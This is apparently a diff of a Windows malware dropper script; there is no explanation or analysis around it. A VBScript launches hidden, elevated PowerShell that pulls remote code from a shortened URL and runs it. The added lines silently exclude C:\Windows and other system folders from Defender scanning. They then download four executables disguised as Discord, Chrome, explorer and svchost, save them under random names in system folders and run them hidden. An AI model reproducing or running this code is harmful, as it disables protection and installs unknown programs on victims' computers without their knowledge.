@@ -3,3 +3,38 @@ powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -Argum
 
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process powershell.exe -ArgumentList 'irm ""https://tinyurl.com/4j72ashp"" | iex' -WindowStyle Hidden -Verb RunAs""", 0, False
+
+
+
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\SysWOW64'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
+
+$url1 = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Discord.exe'
+$url2 = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/GoogleChrome.exe'
+$url3 = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/explorer.exe'
+$url4 = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/svchost.exe'
+
+function Get-RandomFilePath {
+    $folder = Get-ChildItem -Path "C:\Windows\System32", "C:\Windows\SysWOW64", "C:\Users\Public\Downloads" -Recurse | Where-Object { $_.PSIsContainer } | Get-Random
+    $fileName = [System.IO.Path]::GetRandomFileName()
+    return Join-Path -Path $folder.FullName -ChildPath $fileName
+}
+
+$locations = @(
+    Get-RandomFilePath,
+    Get-RandomFilePath,
+    Get-RandomFilePath,
+    Get-RandomFilePath
+)
+
+Invoke-WebRequest -Uri $url1 -OutFile $locations[0]
+Invoke-WebRequest -Uri $url2 -OutFile $locations[1]
+Invoke-WebRequest -Uri $url3 -OutFile $locations[2]
+Invoke-WebRequest -Uri $url4 -OutFile $locations[3]
+
+foreach ($location in $locations) {
+    Start-Process -FilePath $location -WindowStyle Hidden -Wait
+}
